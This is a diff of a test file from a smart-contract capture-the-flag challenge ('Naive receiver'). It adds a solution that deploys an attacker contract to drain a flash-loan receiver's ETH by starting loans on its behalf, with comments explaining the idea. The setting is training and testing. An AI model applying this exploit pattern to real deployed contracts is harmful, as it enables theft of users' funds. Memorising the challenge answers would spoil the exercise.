@@ -19,7 +19,7 @@ describe('[Challenge] Naive receiver', function () {
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
         
         pool = await LenderPoolFactory.deploy();
-        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
+        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL }); //depositing 1000 ETH in pool
         const ETH = await pool.ETH();
         
         expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
@@ -27,7 +27,7 @@ describe('[Challenge] Naive receiver', function () {
         expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);
 
         receiver = await FlashLoanReceiverFactory.deploy(pool.address);
-        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
+        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER }); //depositing 10 ETH in flashloaner receiver
         await expect(
             receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
         ).to.be.reverted;
@@ -37,7 +37,14 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** What we need to do is: call the external onFlashLoan function in the user's address ten times and then give all the 10 ETH to the pool address. */
+        // const ETH = await pool.ETH();
+        // await receiver.connect(player).onFlashLoan(player.address, ETH, ETHER_IN_RECEIVER, 9n**18n, "0x")
+        /**The code above does not work. The caller of that function must be the pool contract. So, we may call the pool contract, in the flashloan function, using the receiver address*/
+        const AttackerFactory = await ethers.getContractFactory('FlashLoanReceiverAttacker', player);
+        this.attacker = await AttackerFactory.deploy(pool.address, receiver.address);
+        await this.attacker.connect(player).attack();
+        
     });
 
     after(async function () {
